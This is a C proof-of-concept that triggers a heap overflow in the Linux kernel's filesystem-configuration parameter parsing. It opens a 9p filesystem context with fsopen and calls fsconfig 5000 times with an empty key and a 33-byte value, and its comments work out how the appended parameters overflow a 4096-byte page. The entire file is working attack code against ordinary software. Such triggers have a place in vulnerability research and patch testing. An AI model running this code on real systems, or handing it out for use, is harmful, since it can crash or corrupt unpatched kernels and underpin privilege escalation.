#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  // syscall implict declaration fix for Raspberry Pi hardware

// syscall table numbers
#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void)
{
        char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // 33 byte length str 
        int fd = 0;
        fd = fsopen("9p", 0); // open a Plan 9 filesystem context (requires root
	                      // prvilege, mitigated via user namespace)
        if (fd < 0) {
                perror("Opening");
                exit(-1);
        }
	// for loop adding 5000 key=value parameters to fsconfig's parse_param function.
	// Overflow calculation: 
	// * NUL-terminated 0 len string key = 1 byte
	// * comma (added by parse_param func) = 1 byte
	// * 33 len string value = 33 bytes
	// Total: 5000 * (33+2) bytes, overflows 4096 PAGE_SIZE
        for (int i = 0; i < 5000; i++) {
                fsconfig(fd, FSCONFIG_SET_STRING, "\x00", val, 0); // aux param is 0 for SET_STRING
        }
        return 0;
}
